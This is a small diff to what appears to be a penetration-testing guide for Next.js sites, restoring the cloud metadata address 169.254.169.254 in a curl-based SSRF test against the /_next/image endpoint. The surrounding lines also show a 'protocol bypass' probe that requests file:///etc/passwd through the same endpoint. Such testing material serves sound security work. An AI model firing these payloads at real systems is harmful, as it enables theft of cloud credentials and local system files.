@@ -104,7 +104,7 @@ curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/_next/data/$BUILD_ID
 
 ```bash
 # Basic SSRF test — internal metadata
-curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/_next/image?url=http://[REDACTED_IP]/latest/meta-data/&w=64&q=75"
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/_next/image?url=http://169.254.169.254/latest/meta-data/&w=64&q=75"
 
 # Protocol bypass attempts
 curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/_next/image?url=file:///etc/passwd&w=64&q=75"
